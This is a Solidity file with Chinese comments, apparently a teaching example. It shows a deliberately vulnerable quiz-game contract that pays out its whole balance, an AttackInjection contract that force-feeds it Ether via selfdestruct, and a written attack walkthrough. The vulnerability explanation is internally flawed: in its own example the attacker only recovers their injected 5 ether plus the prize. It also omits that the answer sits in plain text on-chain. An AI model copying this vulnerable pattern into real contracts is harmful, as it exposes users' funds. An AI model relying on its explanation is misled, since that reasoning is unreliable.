// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*
漏洞名稱: Dependency on External State Data
描述:
  此漏洞原因在於合約依賴外部的狀態資料，例如合約的整體餘額 (this.balance) 會受到除了遊戲參與者之外其他人轉入的 Ether 影響。
  攻擊者可以透過向合約額外注入 Ether (例如利用 selfdestruct 送 Ether 至該合約) 後，再以正確答案觸發 Try()，使得遊戲贏家取得包含非遊戲參與者資金的全部餘額。

使用步驟說明:
  1. 遊戲主持人 (題目發送者) 呼叫 StartGame() 設定題目與正確答案 (hash 值)，並且同時存入遊戲獎金。
  2. 攻擊者利用另一個攻擊合約利用 selfdestruct 的方式，向該合約注入大量 Ether，改變合約的外部狀態 (this.balance)。
  3. 攻擊者以正確答案呼叫 Try() 並附加超過 1 ether，觸發條件後取得合約中的所有 Ether(包含其他人注入的資金)。
*/

contract Game {
    address public questionSender; // 漏洞重點: 題目發送者，外部資料
    string public question;          // 漏洞重點: 題目內容，外部資料
    bytes32 public responseHash;      // 漏洞重點: 正確答案的 keccak256 hash

    // Try 函式，用來檢查答案是否正確，並依靠外部狀態 (this.balance) 決定獎金
    function Try(string calldata _response) external payable {
        require(msg.sender == tx.origin, "Do not use contracts");
        // 漏洞: 使用外部狀態 this.balance, 攻擊者可透過額外注入 Ether 改變合約的餘額
        if (responseHash == keccak256(bytes(_response)) && msg.value > 1 ether) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    // StartGame 函式，用於設定遊戲內容與正確答案
    function StartGame(string calldata _question, string calldata _response) public payable {
        require(responseHash == 0x0, "Game already started");
        responseHash = keccak256(bytes(_response));
        question = _question;
        questionSender = msg.sender;
    }

    // 允許合約接收 Ether (無特別限制)，可被攻擊者用於注入惡意資金
    receive() external payable {}
}

// 攻擊合約：利用 selfdestruct 向 Game 合約注入額外資金
contract AttackInjection {
    // 攻擊者將部署此合約，並在部署時設定目標合約地址
    address payable public target;
    
    constructor(address payable _target) payable {
        target = _target;
    }

    // 執行攻擊：自我銷毀時，將所有 Ether 強制轉入 target 合約
    function attack() external {
        selfdestruct(target);
    }
}

/*
攻擊流程:

1. 部署 Game 合約並由題目發送者啟動遊戲:
   - 呼叫 Game.StartGame("What is 2+2?", "4") 並附帶初始獎金，例如 2 ether。

2. 攻擊者部署 AttackInjection 合約並注入 5 ether，然後呼叫 attack() 方法，
   將 5 ether 強制轉入 Game 合約，此時 Game 合約的 balance 變為 7 ether。

3. 攻擊者以外部帳戶 (EOA) 呼叫 Game.Try("4") 並附帶 > 1 ether (例如 1.5 ether)，
   系統驗證答案正確後，將 Game 合約所有（7 ether）的餘額轉給攻擊者。
*/
